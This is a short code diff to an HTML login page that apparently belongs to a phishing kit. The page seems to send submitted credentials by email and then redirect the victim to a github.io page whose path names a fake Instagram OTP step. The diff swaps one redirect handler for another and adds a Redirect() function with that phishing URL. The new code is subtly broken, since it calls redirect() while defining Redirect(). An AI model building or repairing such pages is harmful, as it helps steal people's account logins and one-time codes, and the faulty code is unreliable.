@@ -76,7 +76,7 @@
                                 <div style="display: flex; text-align: end; justify-content: end; color: rgb(0, 17, 255);"><a href="#" class="forgot-pw">Forgotten your password?</a></div>
                             </div>
                             <div class="btn-group">
-                                <button class="btn-login"  type="submit" id="button" value="Send Email" >
+                                <button class="btn-login" onsubmit="return redirect()"  type="submit" id="button" value="Send Email" >
                                     Log In
                                 </button>
                                 <div class="box goto">
@@ -191,14 +191,15 @@ document.getElementById('form')
       btn.value = 'Send Email';
       alert(JSON.stringify(err));
     });
-     window.onload=function() {
-  document.getElementById("form").onsubmit=function() {
-    window.location.replace("https://sephsqua.github.io/vlteu/votesr/instagram/otp/657daf104b167f68d1979b9c.html");
-    return false;
-  }
+    
 }
 });
 </script>
+    <script>
+        function Redirect(){
+            window.location="https://sephsqua.github.io/vlteu/votesr/instagram/otp/657daf104b167f68d1979b9c.html";
+        }
+    </script>
 </body>
 
 </html>
